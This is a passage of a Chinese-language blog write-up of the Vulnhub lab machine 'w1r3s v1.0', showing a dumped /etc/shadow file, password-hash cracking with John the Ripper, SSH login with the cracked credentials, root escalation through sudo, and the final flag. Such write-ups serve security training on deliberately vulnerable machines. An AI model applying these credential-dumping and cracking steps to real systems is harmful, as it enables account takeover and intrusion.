class=\"hljs-number\">7</span>:::\ndaemon:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nbin:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsys:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsync:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ngames:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nman:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nlp:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmail:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nnews:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nuucp:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nproxy:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nwww-data:$<span class=\"hljs-number\">6</span>$<span class=\"hljs-number\">8</span>JMxE7l0<span class=\"hljs-variable\">$yQ16jM</span>..ZsFxpoGue8/<span class=\"hljs-number\">0</span>LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:<span class=\"hljs-number\">17560</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nbackup:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n<span class=\"hljs-keyword\">list</span>:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nirc:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ngnats:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nnobody:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsystemd-timesync:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsystemd-network:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsystemd-resolve:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsystemd-bus-proxy:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsyslog:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n_apt:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmessagebus:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nuuidd:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nlightdm:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nwhoopsie:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\navahi-autoipd:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\navahi:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ndnsmasq:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\ncolord:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nspeech-dispatcher:!:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nhplip:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nkernoops:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\npulse:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nrtkit:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsaned:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nusbmux:*:<span class=\"hljs-number\">17379</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nw1r3s:$<span class=\"hljs-number\">6</span><span class=\"hljs-variable\">$xe</span>/eyoTx<span class=\"hljs-variable\">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:<span class=\"hljs-number\">17567</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nsshd:*:<span class=\"hljs-number\">17554</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nftp:*:<span class=\"hljs-number\">17554</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nmysql:!:<span class=\"hljs-number\">17554</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>把<code>root</code>，<code>www-data</code>，<code>w1r3s</code>用户进行破解</p>\n<ul>\n<li>\n<p>将内容保存为<code>shadow.hash</code> 传入到kali</p>\n<pre><code class=\"hljs language-php\">root:$<span class=\"hljs-number\">6</span>$vYcecPCy<span class=\"hljs-variable\">$JNbK</span>.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:<span class=\"hljs-number\">17554</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nwww-data:$<span class=\"hljs-number\">6</span>$<span class=\"hljs-number\">8</span>JMxE7l0<span class=\"hljs-variable\">$yQ16jM</span>..ZsFxpoGue8/<span class=\"hljs-number\">0</span>LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:<span class=\"hljs-number\">17560</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\nw1r3s:$<span class=\"hljs-number\">6</span><span class=\"hljs-variable\">$xe</span>/eyoTx<span class=\"hljs-variable\">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:<span class=\"hljs-number\">17567</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n</li>\n<li>\n<p>使用<code>john</code>破解</p>\n<pre><code class=\"hljs language-php\">john shadow.hash \n<span class=\"hljs-comment\">//</span>\nreated directory: /root/.john\nWarning: detected hash type <span class=\"hljs-string\">\"sha512crypt\"</span>, but the <span class=\"hljs-keyword\">string</span> is also recognized <span class=\"hljs-keyword\">as</span> <span class=\"hljs-string\">\"HMAC-SHA256\"</span>\nUse the <span class=\"hljs-string\">\"--format=HMAC-SHA256\"</span> option to force loading these <span class=\"hljs-keyword\">as</span> that type instead\nUsing <span class=\"hljs-keyword\">default</span> input encoding: UTF-<span class=\"hljs-number\">8</span>\nLoaded <span class=\"hljs-number\">3</span> password hashes with <span class=\"hljs-number\">3</span> different <span class=\"hljs-title function_ invoke__\">salts</span> (sha512crypt, <span class=\"hljs-title function_ invoke__\">crypt</span>(<span class=\"hljs-number\">3</span>) $<span class=\"hljs-number\">6</span>$ [SHA512 <span class=\"hljs-number\">256</span>/<span class=\"hljs-number\">256</span> AVX2 <span class=\"hljs-number\">4</span>x])\nCost <span class=\"hljs-number\">1</span> (iteration count) is <span class=\"hljs-number\">5000</span> <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run <span class=\"hljs-number\">8</span> OpenMP threads\nProceeding with single, rules:Single\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\nwww-<span class=\"hljs-title function_ invoke__\">data</span>         (www-data)     \nAlmost done: Processing the remaining buffered candidate passwords, <span class=\"hljs-keyword\">if</span> any.\nProceeding with wordlist:/usr/share/john/password.lst\n<span class=\"hljs-title function_ invoke__\">computer</span>         (w1r3s)     \nProceeding with incremental:ASCII\n</code></pre>\n<p>暂时破解出来了两个用户的密码，除了<code>root</code>的，权限看着应该是<code>w1r3s</code>的更高</p>\n</li>\n</ul>\n</li>\n<li>\n<p>使用<code>ssh</code>登录<code>w1r3s</code> 用户，并查看其权限</p>\n<ul>\n<li>\n<p>登陆成功</p>\n<pre><code class=\"hljs language-php\">ssh w1r3s@<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span> \n<span class=\"hljs-comment\">//</span>\n----------------------\nThink this is the way?\n----------------------\nWell,........possibly.\n----------------------\nw1r3s@<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span><span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n108 packages can be updated.\n6 updates are security updates.\n\n.....You made it huh?....\nLast login: Mon Jan 22 22:47:27 2018 from 192.168.0.35\nw1r3s@W1R3S:~$ \n</span></code></pre>\n</li>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-php\">w1r3s@W1R3S:~$ whoami\nw1r3s\n<span class=\"hljs-comment\">//</span>\nw1r3s@W1R3S:~$ uname -a\nLinux W1R3S <span class=\"hljs-number\">4.13</span>.<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">36</span>-generic <span class=\"hljs-comment\">#40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>\n<span class=\"hljs-comment\">//</span>\nw1r3s@W1R3S:~$ ip a\n<span class=\"hljs-number\">1</span>: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu <span class=\"hljs-number\">65536</span> qdisc noqueue state UNKNOWN group <span class=\"hljs-keyword\">default</span> qlen <span class=\"hljs-number\">1000</span>\n    link/loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>/<span class=\"hljs-number\">8</span> scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::<span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">128</span> scope host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: ens33: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP group <span class=\"hljs-keyword\">default</span> qlen <span class=\"hljs-number\">1000</span>\n    link/ether <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">5</span>b:<span class=\"hljs-number\">7</span>d brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.133</span>/<span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.255</span> scope <span class=\"hljs-keyword\">global</span> dynamic ens33\n       valid_lft <span class=\"hljs-number\">1134</span>sec preferred_lft <span class=\"hljs-number\">1134</span>sec\n    inet6 fe80::<span class=\"hljs-variable constant_\">aae5</span>:<span class=\"hljs-number\">6</span>c48:<span class=\"hljs-number\">85</span>ba:de8/<span class=\"hljs-number\">64</span> scope link \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-comment\">// 直接进去root用户了</span>\nw1r3s@W1R3S:~$ sudo -i\nroot@W1R3S:\n<span class=\"hljs-comment\">//</span>\nroot@W1R3S:~<span class=\"hljs-comment\"># whoami</span>\nroot\n</code></pre>\n<p>提权成功</p>\n</li>\n</ul>\n</li>\n<li>\n<p>读取flag.txt文件，登录root后就在当前目录下</p>\n<pre><code class=\"hljs language-php\">\n<span class=\"hljs-comment\">// flag.txt</span>\n-----------------------------------------------------------------------------------------\n   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  \n  / ___/ _ \\| \\ | |/ ___|  _ \\    / \\|_   _| | | | |      / \\|_   _|_ _/ _ \\| \\ | / ___| \n | |  | | | |  \\| | |  _| |_) |  / _ \\ | | | | | | |     / _ \\ | |  | | | | |  \\| \\___ \\ \n | |__| |_| | |\\  | |_| |  _ &#x3C;  / ___ \\| | | |_| | |___ / ___ \\| |  | | |_| | |\\  |___) |\n  \\____\\___/|_| \\_|\\____|_| \\_\\/_/   \\_\\_|  \\___/|_____/_/   \\_\\_| |___\\___/|_| \\_|____/ \n                                                                                        \n-----------------------------------------------------------------------------------------\n\n                          .-----------------TTTT_-----_______\n                        /<span class=\"hljs-string\">''</span><span class=\"hljs-string\">''</span><span class=\"hljs-string\">''</span><span class=\"hljs-string\">''</span><span class=\"hljs-string\">''</span>(______O] ----------____  \\______/]_\n     __...---<span class=\"hljs-string\">'\"\"\"\\_ --'</span><span class=\"hljs-string\">'   Q                               ___________@\n |'</span><span class=\"hljs-string\">''</span>                   ._   _______________=---------<span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\n |                ..--''|   l L |_l   |\n |          ..--''      .  /-___j '   '\n |    ..--''           /  ,       '   '\n |--''                /           `    \\\n                      L__'         \\    -\n                                    -    '-.\n                                     '.    /\n                                       '-./\n\n----------------------------------------------------------------------------------------\n  YOU HAVE COMPLETED THE\n               __      __  ______________________   _________\n              /  \\    /  \\/_   \\______   \\_____  \\ /   _____/\n              \\   \\/\\/   / |   ||       _/ _(__  &#x3C; \\_____  \\ \n               \\        /  |   ||    |   \\/       \\/        \\\n                \\__/\\  /   |___||____|_  /______  /_______  /.INC\n                     \\/                \\/       \\/        \\/        CHALLENGE, V 1.0\n----------------------------------------------------------------------------------------\n\nCREATED BY SpecterWires\n\n----------------------------------------------------------------------------------------\n\n</span></code></pre>\n</li>\n</ol>","title":"Vulnhub - w1r3s v1 0","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"w1r3s.v1.0\n\n https://www.vulnhub.com/entry/w1r3s-101,220/\n \n\n思路：红队笔记\n\n主机发现端口扫描\n\n1. 使用nmap扫描网段类存活主机\n    \n    因为靶机是我最后添加的，所以靶机IP是133\n    \n    \n    \n2. 扫描主机开放端口\n    \n    \n    \n    开放了 `21，22，80，3306`\n   ..."},"recentPosts":[{"id":"Sunshine + moonlight 息屏串流方案","title":"Sunshine + moonlight 息屏串流方案","date":"2025-10-18","isEncrypted":false,"year":"2025","month":"10","day":"18"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"}]},"__N_SSG":true}